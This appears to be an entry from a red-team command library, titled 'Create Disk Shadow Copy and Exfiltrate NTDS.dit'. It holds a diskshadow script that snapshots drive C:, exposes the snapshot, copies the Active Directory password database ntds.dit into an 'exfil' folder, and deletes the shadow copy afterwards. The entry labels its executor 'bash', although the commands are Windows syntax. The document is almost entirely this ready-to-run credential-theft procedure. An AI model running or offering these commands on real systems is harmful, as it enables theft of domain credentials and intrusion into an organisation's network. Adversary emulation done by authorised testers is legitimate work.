---
id: 92ab1439-f0e5-424e-82ab-9ca07732adf9
name: Create Disk Shadow Copy and Exfiltrate NTDS.dit
type: command
executor: bash
data: 'set context persistent nowriters

  add volume c: alias someAlias

  create

  expose %someAlias% z:

  exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit

  delete shadows volume %someAlias%

  reset'
output: null
created_at: '2023-04-06T03:56:03.901972+00:00'
updated_at: '2023-04-10T20:26:16.428517+00:00'
---

# Create Disk Shadow Copy and Exfiltrate NTDS.dit

```bash
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
delete shadows volume %someAlias%
reset
```
